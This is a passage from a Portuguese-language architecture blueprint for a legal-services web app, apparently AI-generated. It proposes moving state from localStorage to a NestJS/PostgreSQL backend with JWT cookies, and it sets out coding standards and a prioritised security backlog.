│  │  (Zustand)   │   │ (TanStack Query) │   │ (AuthContext│ │
│  │              │   │                  │   │  + JWT)     │ │
│  │  - Modais    │   │  - Lawyers       │   │             │ │
│  │  - Sidebar   │   │  - Clients       │   │  - user     │ │
│  │  - Filtros   │   │  - Cases         │   │  - role     │ │
│  │  - Chatbot   │   │  - Finance       │   │  - permissions│ │
│  │  - Tabs      │   │  - Staff         │   │  - isLoading│ │
│  │              │   │  - Documents     │   │             │ │
│  └──────────────┘   └────────┬─────────┘   └──────┬──────┘ │
│                              │                     │        │
└──────────────────────────────┼─────────────────────┼────────┘
                               │                     │
                               ▼                     ▼
               ┌───────────────────────────────────────────┐
               │        NestJS API Backend                  │
               │  /api/lawyers  /api/clients  /api/auth     │
               │  /api/cases    /api/finance  /api/staff    │
               └───────────────────────────┬───────────────┘
                                           │
                              ┌────────────┴────────────┐
                              │       PostgreSQL         │
                              │  (única fonte de verdade │
                              │   para todos os dados)   │
                              └─────────────────────────┘

┌──────────────────────────────────────────────────────────────┐
│              CONFIGURAÇÃO GLOBAL (React Context)             │
│  BrandingContext  ← appName, tagline (não-sensível)         │
│  FeatureFlagsContext ← features do plano (consultadas via API)│
└──────────────────────────────────────────────────────────────┘
```

### 11.2 Responsabilidade por Camada

#### **UI State — Zustand Store**
```typescript
// stores/ui.store.ts
interface UIStore {
  // Modais
  activeModal: 'login' | 'terms' | 'privacy' | 'etaOab' | null;
  openModal: (modal: UIStore['activeModal']) => void;
  closeModal: () => void;

  // Chatbot
  isChatbotOpen: boolean;
  chatHistory: ChatMessage[];
  chatIsLoading: boolean;
  toggleChatbot: () => void;
  appendChatMessage: (msg: ChatMessage) => void;

  // Layout
  sidebarCollapsed: boolean;
  toggleSidebar: () => void;

  // Search/Filters
  lawyerSearchFilters: LawyerSearchFilters;
  setLawyerSearchFilters: (filters: Partial<LawyerSearchFilters>) => void;
}
```

#### **Server State — TanStack Query**
```typescript
// services/queries/useLawyers.ts
export function useLawyers(filters?: LawyerFilters) {
  return useQuery({
    queryKey: ['lawyers', filters],
    queryFn: () => lawyersApi.getAll(filters),
    staleTime: 5 * 60 * 1000,    // 5 minutos
    gcTime: 30 * 60 * 1000,      // 30 minutos em cache
  });
}

export function useAddLawyer() {
  const queryClient = useQueryClient();
  return useMutation({
    mutationFn: (data: CreateLawyerDto) => lawyersApi.create(data),
    onSuccess: () => queryClient.invalidateQueries({ queryKey: ['lawyers'] }),
  });
}

// services/queries/useClients.ts
export function useClients(page = 1, limit = 20) {
  return useQuery({
    queryKey: ['clients', page, limit],
    queryFn: () => clientsApi.getAll({ page, limit }),
    staleTime: 2 * 60 * 1000,
  });
}

// services/queries/useFinancial.ts
export function useFinancialSummary(period: DateRange) {
  return useQuery({
    queryKey: ['financial', 'summary', period],
    queryFn: () => financialApi.getSummary(period),
    staleTime: 60 * 1000,  // 1 minuto (dados financeiros mudam mais)
  });
}
```

#### **Auth State — AuthContext + JWT**
```typescript
// core/auth/AuthContext.tsx
interface AuthState {
  user: UserSession | null;
  isAuthenticated: boolean;
  isLoading: boolean;
  login: (credentials: LoginDto) => Promise<void>;
  logout: () => Promise<void>;
  refreshSession: () => Promise<void>;
}

// Implementação:
// 1. POST /api/auth/login → recebe JWT em httpOnly cookie
// 2. user profile carregado via GET /api/auth/me
// 3. Token renovado automaticamente (refresh token)
// 4. Sem localStorage — token inacessível ao JavaScript
```

#### **Global Config — BrandingContext (simplificado)**
```typescript
// contexts/BrandingContext.tsx
interface BrandingConfig {
  appName: string;
  siteTagline: string;
  footerText: string;
  logoUrl: string;         // URL CDN — não base64
  contactEmail: string;
}
// Carregado via useQuery(['branding']) → GET /api/config/public
// Sem credenciais, sem dados sensíveis
```

---

## ETAPA 12 — MIGRAÇÃO PARA ARQUITETURA SERVER-DRIVEN

### 12.1 Camada Repository

**Padrão Atual (Acoplamento Direto):**
```
Componente → localStorage.setItem() diretamente
          ou
Componente → AppDataContext.updateLawyer() → localStorage
```

**Padrão Futuro (Repository Pattern):**
```
Componente
    ↓ usa hook
useAddLawyer() mutation
    ↓ chama API function
lawyersApi.create(data)
    ↓ axios request
GET /api/lawyers (NestJS)
    ↓ Prisma ORM
PostgreSQL → retorna dados
    ↓ React Query cache
Componente re-renderiza com novos dados
```

### 12.2 Ordem de Migração por Entidade

```
Prioridade 1 — SEGURANÇA (Semanas 1–2):
  1. Autenticação → AuthContext + JWT + POST /api/auth/login
  2. Admin Users  → Remover de localStorage; GET /api/auth/me
  3. Staff        → StaffRepository → GET /api/staff (apenas super_admin)

Prioridade 2 — DADOS PRINCIPAIS (Semanas 3–6):
  4. Advogados    → LawyersRepository → GET /api/lawyers (com paginação)
  5. Clientes     → ClientsRepository → GET /api/clients (com paginação + ACL)
  6. Serviços     → ServicesRepository → GET /api/services (público)

Prioridade 3 — NEGÓCIO (Semanas 7–10):
  7. Estagiários  → InternsRepository → GET /api/interns
  8. Secretárias  → SecretariesRepository → GET /api/secretaries
  9. Provisionamentos → ProvisioningRepository → Bull Queue

Prioridade 4 — FINANCEIRO E AUDIT (Semanas 11–14):
  10. Transações  → FinancialRepository → GET /api/finance/transactions
  11. Audit Log   → Stream → POST /api/audit (imutável no servidor)
  12. Documentos  → S3 presigned URLs → POST /api/documents/upload
```

### 12.3 Migração do `dbCloud` Existente

O código em `dbService.ts.dbCloud` já implementa `saveDocument`, `getDocument`, `deleteDocument` para Firebase e Supabase. Porém, está **desconectado do fluxo de dados**. Em vez de refatorar o `dbCloud`, a estratégia é:

1. **Abandonar** o `dbCloud` do frontend.
2. **Implementar** as chamadas HTTP via `axios` para o NestJS backend.
3. O NestJS backend usa o `schema.prisma` já existente para PostgreSQL.

O `dbCloud` pode ser preservado temporariamente apenas para o **sync de configuração de branding** (dados não-sensíveis), enquanto as entidades críticas migram para o backend.

---

## ETAPA 13 — DEFINIÇÃO DE PADRÕES TÉCNICOS OBRIGATÓRIOS

### 13.1 Padrão de Hooks de Dados (React Query)

```typescript
// services/queries/ — Convenção obrigatória

// READ hooks — prefixo 'use[Entidade]'
useLawyers(filters?)             → GET /api/lawyers
useLawyer(id: string)            → GET /api/lawyers/:id
useClients(page, limit)          → GET /api/clients
useClient(id: string)            → GET /api/clients/:id
useCases(lawyerId?, clientId?)   → GET /api/cases
useFinancialSummary(period)      → GET /api/finance/summary
useAuditLog(filters)             → GET /api/audit
useStaff()                       → GET /api/staff
useProvisionings()               → GET /api/provisioning

// WRITE hooks — prefixo 'use[Ação][Entidade]'
useCreateLawyer()                → POST /api/lawyers
useUpdateLawyer(id)              → PATCH /api/lawyers/:id
useSuspendLawyer(id)             → PATCH /api/lawyers/:id/suspend
useCreateClient()                → POST /api/clients
useCreateCase()                  → POST /api/cases
useUpdateCaseStatus(id)          → PATCH /api/cases/:id/status
useCreateTransaction()           → POST /api/finance/transactions
useCreateProvisioning()          → POST /api/provisioning
```

### 13.2 Padrão de Stores Zustand

```typescript
// stores/ui.store.ts          ← Estado de interface (modais, sidebar, tabs)
// stores/search.store.ts      ← Filtros de busca persistentes na sessão
// stores/notification.store.ts ← Fila de notificações/toasts

// Convenção de naming:
// ✅ useUIStore()           ← sempre em store separado por domínio
// ✅ useSearchStore()
// ❌ store global único     ← evitar Redux-style um-store-para-tudo
```

### 13.3 Padrão de Contextos Simplificados

```typescript
// contexts/ — Apenas configuração não-sensível

BrandingContext     ← { appName, tagline, logoUrl, contactEmail }
FeatureFlagsContext ← { hasAi, hasVideoCall, hasDocMgmt }
// SEM: dados de usuários, credenciais, PII, financial data
```

### 13.4 API Client Padrão

```typescript
// services/api/apiClient.ts
const apiClient = axios.create({
  baseURL: import.meta.env.VITE_API_URL,  // https://api.legisconnect.com.br
  withCredentials: true,                   // inclui httpOnly cookie JWT
  timeout: 10_000,
});

// Interceptor de request — sem necessidade de adicionar token manual (cookie automático)
// Interceptor de response — handle 401 → redirect /entrar
//                         — handle 403 → toast 'Sem permissão'
//                         — handle 500 → Sentry.captureException()
```

---

## ETAPA 14 — PLANO DE IMPLEMENTAÇÃO (BACKLOG)

### STATE-001 — Implementar AuthContext + JWT
```
Problema: Autenticação 100% client-side em localStorage; role manipulável.
Impacto: Comprometimento total do painel admin via DevTools.
Solução: AuthContext + POST /api/auth/login → JWT httpOnly cookie.
Prioridade: 🔴 CRÍTICA | Complexidade: Alta | Estimativa: 80h
Dependências: Backend NestJS (TECH-001, TECH-002)
```

### STATE-002 — Eliminar PII do localStorage
```
Problema: CPF, endereço, histórico de casos em plaintext no browser.
Impacto: Violação massiva da LGPD; risco de multa R$50M.
Solução: Migrar clients, interns, secretaries para PostgreSQL server-side.
Prioridade: 🔴 CRÍTICA | Complexidade: Média | Estimativa: 60h
Dependências: STATE-001, Backend NestJS
```

### STATE-003 — Implementar TanStack Query para Server State
```
Problema: AppDataContext gerencia Server State com localStorage.
Impacto: Sem cache inteligente; sem invalidação; re-renders excessivos.
Solução: @tanstack/react-query + hooks useLawyers(), useClients(), etc.
Prioridade: 🔴 ALTA | Complexidade: Alta | Estimativa: 120h
Dependências: STATE-001, Backend APIs disponíveis
```

### STATE-004 — Remover dbApiKey do Frontend
```
Problema: Credenciais Firebase/Supabase em localStorage.legis_app_config.
Impacto: Exposição de credenciais de banco de dados.
Solução: Configuração de cloud database apenas server-side (env vars NestJS).
Prioridade: 🔴 CRÍTICA | Complexidade: Baixa | Estimativa: 16h
Dependências: Nenhuma (pode ser feito imediatamente)
```

### STATE-005 — Implementar Zustand para UI State
```
Problema: 14 estados de UI no App.tsx causando re-renders globais.
Impacto: Performance degradada; impossível testar modais isoladamente.
Solução: Zustand store para modais, chatbot, sidebar, filtros.
Prioridade: 🟡 MÉDIA | Complexidade: Baixa | Estimativa: 40h
Dependências: FRONT-004 (React Router)
```

### STATE-006 — Dividir AppDataContext em Contextos por Domínio
```
Problema: 6 entidades em 1 Context → re-render de toda a árvore.
Impacto: Performance degradada com listas grandes.
Solução: LawyersContext, ClientsContext, ServicesContext (ou usar React Query diretamente).
Prioridade: 🟡 MÉDIA | Complexidade: Média | Estimativa: 48h
Dependências: STATE-003 (se migrar para React Query, Context não é necessário)
```

### STATE-007 — Migrar Audit Log para Servidor
```
Problema: Audit log em localStorage é adulterável e truncado.
Impacto: Sem validade jurídica; violação de requisitos de compliance.
Solução: POST /api/audit → imutável (append-only) → CloudWatch/Datadog.
Prioridade: 🔴 ALTA | Complexidade: Média | Estimativa: 60h
Dependências: Backend NestJS
```

### STATE-008 — Implementar Cross-Tab Synchronization Completa
```
Problema: StorageEvent não propaga clients, interns, secretaries.
Impacto: Admin vê dados inconsistentes entre abas.
Solução: Com React Query, invalidar queries via BroadcastChannel API ou WebSocket.
Prioridade: 🟡 MÉDIA | Complexidade: Baixa | Estimativa: 24h
Dependências: STATE-003
```

### STATE-009 — Otimizar AppConfig — Remover Base64 do Estado
```
Problema: Logo base64 (2–5MB) armazenado em React state + localStorage.
Impacto: localStorage quota exceeded; re-render com objeto gigante.
Solução: Upload para S3; armazenar apenas URL no estado.
Prioridade: 🟡 MÉDIA | Complexidade: Média | Estimativa: 40h
Dependências: Backend NestJS + S3
```

### STATE-010 — Implementar Session Expiry + Refresh Token
```
Problema: Sessão (legis_user) sem expiração — válida para sempre.
Impacto: Sessão roubada permanece válida indefinidamente.
Solução: JWT access token TTL 15min + refresh token 7 dias (rotation).
Prioridade: 🔴 ALTA | Complexidade: Média | Estimativa: 48h
Dependências: STATE-001
```

### 14.1 Sequência de Execução

**Curto Prazo (0–30 dias) — Segurança Emergencial:**
```
Semana 1: STATE-004 (remover dbApiKey do frontend) — sem dependências
Semana 2: STATE-001 (AuthContext + JWT) — mínimo viável de segurança
Semana 3-4: STATE-002 (eliminar PII do localStorage)
```

**Médio Prazo (30–90 dias) — Migração para Server State:**
```
Mês 2: STATE-003 (TanStack Query) + STATE-007 (Audit log server-side)
Mês 3: STATE-005 (Zustand UI) + STATE-008 (cross-tab sync) + STATE-010 (session expiry)
```

**Longo Prazo (90–180 dias) — Otimização e Qualidade:**
```
Mês 4-5: STATE-006 (dividir AppDataContext) + STATE-009 (logos S3)
Mês 6: Cobertura de testes para todos os stores e contextos
```

---

## ENTREGÁVEIS — RESUMO

| Entregável | Seção | Status |
|---|---|---|
| ✅ Inventário completo dos estados (30 estados + 3 secrets) | Etapa 1 | Concluído |
| ✅ Mapa de fluxo de dados (5 fluxos documentados) | Etapa 4 | Concluído |
| ✅ Auditoria profunda do AppContext | Etapa 2 | Concluído |
| ✅ Auditoria profunda do AppDataContext | Etapa 3 | Concluído |
| ✅ Matriz de acoplamento (10 módulos avaliados) | Etapa 5 | Concluído |
| ✅ Classificação Global × Local × Server State (29 estados) | Etapa 6 | Concluído |
| ✅ Análise de persistência (7 problemas + análise dbCloud) | Etapa 7 | Concluído |
| ✅ Análise de performance e memoização | Etapa 8 | Concluído |
| ✅ Análise de segurança (11 vetores + 5 ataques) | Etapa 9 | Concluído |
| ✅ Scorecard arquitetural (22/100) | Etapa 10 | Concluído |
| ✅ Nova arquitetura proposta (3 camadas + diagramas) | Etapa 11 | Concluído |
| ✅ Plano de migração server-driven (12 entidades, ordem priorizada) | Etapa 12 | Concluído |
| ✅ Padrões técnicos obrigatórios (hooks, stores, API client) | Etapa 13 | Concluído |
| ✅ Backlog de implementação (10 itens STATE-001 a STATE-010) | Etapa 14 | Concluído |

---

*Documento gerado em 25/07/2026 | Prompt 003 — State Management Architecture Blueprint | v1.0.0*
*Próximo: PROMPT 004 — Especificação da API NestJS Backend (Rotas, Módulos, Guards, DTOs)*
